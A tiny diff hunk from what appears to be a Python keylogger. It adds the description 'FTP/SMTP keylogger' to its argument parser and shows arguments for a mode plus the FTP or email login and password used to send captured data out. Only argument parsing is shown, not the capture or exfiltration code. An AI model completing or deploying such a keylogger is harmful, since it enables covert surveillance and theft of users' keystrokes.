@@ -10,7 +10,7 @@ import sys
 import threading
 from typing import Optional
 
-parser = argparse.ArgumentParser()
+parser = argparse.ArgumentParser(description="FTP/SMTP keylogger")
 parser.add_argument("mode", choices=["ftp", "smtp"])
 parser.add_argument("login", help="Username for FTP/email for SMTP")
 parser.add_argument("password", help="Password for FTP user/email account")
